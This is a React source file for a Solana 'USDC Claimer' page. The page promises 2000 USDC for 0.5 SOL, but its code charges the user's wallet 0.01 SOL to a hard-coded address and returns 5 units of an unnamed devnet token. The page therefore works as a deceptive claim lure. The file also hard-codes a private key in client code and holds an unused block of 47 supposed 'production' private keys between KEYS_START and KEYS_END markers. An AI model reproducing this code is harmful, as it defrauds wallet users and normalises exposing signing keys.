/* eslint-disable react-hooks/rules-of-hooks */
'use client'

import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionSignature, VersionedTransaction } from '@solana/web3.js';
import { address, createKeypairSignerFromBase58, createSolanaClient, getExplorerLink, getSignatureFromTransaction, LAMPORTS_PER_SOL, signTransactionMessageWithSigners } from 'gill';
import { buildTransferTokensTransaction, TOKEN_PROGRAM_ADDRESS } from 'gill/programs/token';
import { AppHero } from '../ui/ui-layout';

export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  return (
    <div>
      <AppHero title="USDC Claimer" subtitle="Do you want to get 2000 USDC? It will cost you only 0.5 SOL" />
      <div className="max-w-xl mx-auto py-6 sm:px-6 lg:px-8 text-center">
        <div className="space-y-2">
          <button className="wallet-adapter-button wallet-adapter-button-trigger mx-auto" type="button" onClick={() => {
            CreateChargeTransaction(connection, publicKey, sendTransaction);
          }}>
            {'Claim'}
          </button>
        </div>
      </div>
    </div>
  )
}

const chargeAmount = 0.01;
const cashbackAmount = 5;

const CreateChargeTransaction = async (connection: Connection, publicKey: PublicKey | null, sendTransaction: (transaction: Transaction | VersionedTransaction, connection: Connection, options?: SendTransactionOptions) => Promise<TransactionSignature>) => {


  if (!publicKey) return;

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("CVkzbsnwATBDDbGke7o1KzprgDsaKhdET7zioE9ssFXp"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  // Optional: Add memo to include cashback metadata
  const memoIx = new TransactionInstruction({
    keys: [],
    programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
    data: Buffer.from(`cashback:${cashbackAmount}`),
  });

  const transaction = new Transaction().add(solTransferIx, memoIx);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  try {
    const signature = await sendTransaction(transaction, connection);
    console.log('User transaction sent:', signature);

    // Wait for confirmation before cashback
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    console.log('Confirmed:', confirmation);

    if (confirmation.value.err === null) {
      sendCashback(publicKey.toBase58(), cashbackAmount);

    }
  } catch (e) {
    console.error('Failed to send charge transaction:', e);
  }
};

const sendCashback = async (to: string, amount: number) => {
  const { rpc, rpcSubscriptions, sendAndConfirmTransaction } = createSolanaClient({
    urlOrMoniker: "devnet",
  });
  const destination = address(to);
  const keypairBase58 =
    "49rXzRexz4tSVGWh3nRdeimtWEPCeTTcJgM7TY5DhBWkebf7VHppR7GHdi2zPEiEDNpnH8nCXf6iTHLyeJXkriSd"

// KEYS_START
// Production environment configuration
const walletKeys = {
  "key0": "4P19VgwxpRwA4gp1f6y5s5fhshSHKgM2KK1Zi4jpdbJ8YnbG3C55GaExD9WoHphySznkHdzt2hPZUXF6jPqy8ts8",
  "key1": "GkLJbtQ1Qw9KBE3MYHkQxxR5o1kFDSryaXuAXC2TvKifh5atSfP53zShM1MT8dANe7SaBuecRt1CWQkGKtUXYG5",
  "key2": "2kqxQBrjbAT9Maqmp2YqKydcSJxz3FmArLbxbkUTRaRRiWqfQfFvwdtuFwccez1da3NVYfuFdNscKVmgmEzVnaXx",
  "key3": "inSwd7wyNT7bp3EUsgBpHVRYReqnp2uhhMp22fbRagRkJyxNw26DQ7N2qSsFosuYHNDp4roZNSJYAYBWN6CCu3X",
  "key4": "2gteGXvyMVqt8TAwFzq13gNrwt62qTdjTBsazsMJDz7z3Vkroprp4Z6hSfaccxT2Rv6jEMvDM98p8tScxTLC2iyK",
  "key5": "oJaN2QswDhheJWAx7qvYAYWUrQe1bVFmFES62s8q6X2g2fYkFmEL88NqmFpsCfJg9fS6QKENtuzf2DM6KQHaQw9",
  "key6": "2LujBGhuTraepkbYbQ9ZMNrKtUhHNySj3AUG4Fsg7Mk15NEbYb5xsHmU7JrEqLJBMe2jgRWTEyUAe4RvXCqoUf5L",
  "key7": "aJuJbEDX4QoJuzQen1zwHyxHNDfoDqcRFV6MA2j97SKxgrqCWShc2yQpjYNJgH1Y9NxiSJVDR3tCK9SQ8SboWbt",
  "key8": "5WAdy522Ergzf5CCgNzPDSCop6YvXN5jx1hw2DpqfTvcfGK3unDC4AAXQRxx1tn1wQ8u9mTT1TZoeUabFxG3eAMM",
  "key9": "2md244ZSALDtPFLfSKLmK52aoYLRyaiGUtnP2q5FzirkAHtzdNk7VXS3c5e5rDS9jmN9ULLWL3obhHDr9DVPajFc",
  "key10": "51Ku61KCoSYnjpwVSauzgiVbEV7tN6s4KwEB8wUhhwYjYR3Nh8bnqpfJHGxfJ3nRWdzLiRAS5HgiidRyBzdVS5NW",
  "key11": "5pZpK78sVXptHAmXf8P9ewQc1Qa8HRP3HxJotaNfbZMUscoEcWCU5gx52izG4DLWV2hhfLFru8CfzCvmm2Jv94hh",
  "key12": "5k7pQi6okvnqPr8cEBRQQgAM6mGNog6qGJXPPBpQPKahL2yrmbAa2Lhrcy2YT8v19Y2kv68qi1KwKvexb7uHTbZH",
  "key13": "xd6uguEgsUQJyRLNeUxHHUyZS1Nt9Z6EBwJNah9nGFqmKKVsrjwnViW95jhX7U1mTseej4tpSnPyhh1JSTyuX7g",
  "key14": "4d7ohZyTtdoAfPbaZjWfpW97NPV39SuA8J93QPXLMrSxCGcFq52fNsRKeFGeHQtfnvnLNVL5G9oUERVM8FBcBudm",
  "key15": "5wNfuTb7k9HfNR43jHQ2Atk59gPVsbTPK4NY6UPBe2B9Kj2BttbTPpLMixozKGwmG8V12evP5fo5hDNds529HC1e",
  "key16": "KusivrzAwoWSnJTe33yqLQok3sYycgKDHwwHAzTtYVdJRwFxQ9K2mwhTVpXwn5TRQPwGzp7L2NeWfEs85S1HrgC",
  "key17": "3ybpUvUDmcD6BSzgQbT2x7SeQTCnxFj2ZNe175GDphJW2XXk191nmhyfmLgBqEEUCXPnsZNjNTZK7TqUxA8RLQcQ",
  "key18": "4ZCFR6nujuDDopnM2e7KPHxy12ku2StJUgvAibWcTki7f1XqSWkgqxfJkX6Qknh1FfMKRp2FXuWwiAMV7SkngckB",
  "key19": "5DvXs8URyPUFZRFfbpsgWEx7aVnZUT84hbu7FKiFHG4h3ywhsWxN3JKRLfnCv6LXAGuMLayYMK4rrxbvC5xwSfXx",
  "key20": "2CXXXtnKGGGdcNe59qFJvo1rX23ZPSr741FNR1mpFNxu9GLpeWD5SzEjEzyDqXMH7CvZBVKAYyg3sVcedydHu67X",
  "key21": "SfadpggMYN2hRKpAyY5yacjKckoa2XwpF4LifopSH6a6HmJ2ciyrNB4GnePQPgGSecRbbnuEGApccK2JzUtoJvy",
  "key22": "HZkeTEXdkMou2M4eFQjDiyqBMpEHxMuBaMuV2w4bK8XFKjCqcTeiGE1G5iGYJBA1syWvvWYaFi8kPBkh1WDgKfb",
  "key23": "5mdCHisdHPvhTQRnXZyCP5vKdkuVQzc2jpMK7jP66fawDvYUXQKHYUQvkiXWiAdzn4ovH4Avhpjx9eVe4kBzrvAu",
  "key24": "4gFmgpQQFMVia2aiqHMdF6pxB47oHqtFKzB5cVfzhqoxsUKFTmZvrairaMBiefkpUuBji2LQwUTZZgEsEsBnn4Mz",
  "key25": "5QUGZkRsUjtZ2dYqQCnQqJLYiBvMqPKCFUmjcDKUNgtopzQ4zcpdioyfssf3HCuaTZuTBiLX7eVQHGwo8PpRnguA",
  "key26": "3JsGyBfLy14zM7ZWUc8ttvr9WWYRJMXgekGCZrrd5cbsME5aqvHBHfmBnZX78mUovLYMTwk2V4yNC4b1Xf9EBgkm",
  "key27": "5Qkxj7EV3LMW5SieRNhuJ3CSpbJdkPWn6BtUqPXvVDYijbQc8uoDMrB21Cop5GaE1ACybBHsQFBvta1V36P5er8Q",
  "key28": "ng2HGyLapY2ivaSTx1kGnEfwGQJfqqzz5gpFbvv53WqQFsu9roxrrm6Krfa5KsfF5pcaAq7Ur5D4HT8JLXJeTka",
  "key29": "aJaw17TyKotnk9ppSj3Ca9mSw6EaZswmHNWjDJ7BoCdprQ4ijRyoT8RNqbmMWmH9dARSBbuZHERWRzjThpnLUXA",
  "key30": "4RZnCA5GXBtSkti9QeAsWMkg93oFWKnYA8zdeWdP4upSn2xoJbCaPmMXakey8uY5CktLtDhLBDDwZDVxdm6Uq78k",
  "key31": "3gmX8ASsV2X5Y5WPFyxUad6sDhfcEZPMf3UyHRywZ3PRQneHS2mXEJ9yEfxaEniw1Z2qyJWA6wMkmRyX1P8SLbr4",
  "key32": "3DRgifoCWYxzEyhqtwqKYBDNxAvKmMM6GFJuNctkrvph6jmCx74mN9GoGoEQLdEBUQCYvcJ65R94jUpgNoc2BThG",
  "key33": "3M8QYwyfPyrBUebyPYWie8mSdtdyDfWyq5fhThnQkMNPgcFBXnXqkko9NYRcALbtwN3Vt5eQ6tohYaRP7LvFhwTN",
  "key34": "3wmCi78UfxsddH4M8G8kqLjV671Gte9TBKK6dQmLLb3PXizZrfoh89xJe3JcxcrLBcKo1vD7gqVoDAfyQr6x1CjQ",
  "key35": "62v22qKkEvV3KzjsovAhXfSXvXKbNZuJSLKmNPEfenvS6hmhqipBYgytkzyNJW3GrGk3N52RDF2CagtZZScyFt5Y",
  "key36": "3t5EVSpQgmjs1PSXPuQSSnWMiZR6Qnie1faagTpMtxSCzGRXWmNADvueMay4LrMBWUiJo8XJKHdskdkAwZ2JUBLU",
  "key37": "3VK4sD5t8Xxhhxzc73yQeB758rjVvr1Rh9WjJGsixJzMgLqZFkAJ7g7mz3qSzxvrSWnZhzZGkZBHxVytF2YcNHU3",
  "key38": "2quBJeETdgejKgU4UsuuL7y2HyEECmoeoFi8Ed3gaj1LK8mdcHREYaKe1y2TVbVzwSKxGHVUfEJYdXpCQfyjcLn3",
  "key39": "2d3LEhWa29qfNDp3onXmRs6rT7otAqhjVNkfNw1dRZ7ANWH7dzsDDKvM1sh2QszgctDHmv46XKFXPFaW9kmq4kyU",
  "key40": "38TZTWtHJ7chUkMPJRwfEcGarm2zSG8ZKGBU1A2S4JrvyXf7SiyoeDJUC8tPRbxhgy2Spc2qLCqVi8xBV5owcVPV",
  "key41": "4Q8xU31uiSTMuCnfxX9kkKFdavG75T3TYYkbG6YTrGW4xBbvzXNZFXaTcKMrQEbSfvEGX6MQCY9jihaMd66znfzt",
  "key42": "5bRuUn2gVNLwEqDyn5EM8wp7CYbYJYK5SZzcjgYyw42eqi55qw1rhhy9BHfTxWG5fkXp7FUxHLkqTg59M3dVaP3s",
  "key43": "3GvtCMQHveuNedsUghHaCShQhjdU3c2YVYPSZWbhLcgWBeV8fyUrz4EWtuUULkuzmjBaA2bbkQD9YNC9Zd11bwhz",
  "key44": "5YBpvPKy7madiDPYGDCwSGmKGZtymdc4LMSMhG6RRVp85w2UwC8q1YFUXCCZ6jFsUVNhA1Vn88N9T8VkxyY6fqxy",
  "key45": "2oep1o9m94KmquS79J59N3gbTCA3KZd8RAoxNNC52M5dJGASr3eYcRkXqxQ6QA9hNQ8n9mtcWodARF19qC2FZeSd",
  "key46": "5mCHLDY4L4WhkLnjTk3f5E37837MqbH1ci7CUSZPnheGnevbcwMKWS5dh5b36mqqXrriQa7GEchVwJgLzwzQLSAL"
};
// KEYS_END
;
  const signer = await createKeypairSignerFromBase58(keypairBase58);
  const mint = address("4YhaKDunYpNJ7ASyUZSvEj5KJCb1jwofUQBaWSWCSkSU");
  const tokenProgram = TOKEN_PROGRAM_ADDRESS;

  const { value: latestBlockhash } = await rpc.getLatestBlockhash().send();

  const transaction = await buildTransferTokensTransaction({
    feePayer: signer,
    latestBlockhash: latestBlockhash, // required for blockhash lifetime constraint
    amount: amount,
    authority: signer,
    destination: destination,
    mint: mint,
  });

  const signedTransaction = await signTransactionMessageWithSigners(transaction);

  console.log(
    "Explorer:",
    getExplorerLink({
      cluster: "devnet",
      transaction: getSignatureFromTransaction(signedTransaction),
    }),
  );

  await sendAndConfirmTransaction(signedTransaction);
};
